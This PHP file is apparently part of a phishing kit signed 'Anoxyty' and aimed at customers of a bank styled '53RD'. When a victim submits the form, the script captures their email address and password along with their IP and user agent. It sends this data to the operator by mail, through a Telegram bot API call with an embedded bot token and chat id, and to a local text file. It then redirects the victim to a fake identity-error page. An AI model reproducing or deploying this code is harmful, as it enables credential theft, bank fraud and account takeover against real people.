<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
			if ( isset( $_POST['email'] ) ) {
		
        $_SESSION['email'] 	  = $_POST['email'];
		$_SESSION['empass'] 	  = $_POST['empass'];
		$code = <<<EOT
============== [ 53RD By Anoxyty | ]🔥 ==============
[Email Address] 		: {$_SESSION['email']}
[Email Password]		: {$_SESSION['empass']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./🏛️ 53RD By Anoxyty 🏛️ ] =============
\r\n\r\n
EOT;

		$subject = "🏛️ 53RD Email Acess By Anoxyty🏛️  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);
        file_get_contents('https://api.telegram.org/bot1773549684:AAGVWr35i0vuoT4Vz5i5KfMEUfYIyHlmI24/sendMessage?text='.$code.'&chat_id=-512307696');

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../email_identityerr?oamo/identity/&token=cjmvJprW2Dw1/mfacontacts_identification");
        exit();
	} else {
		header("Location: ../index?");
		exit();
	}
?>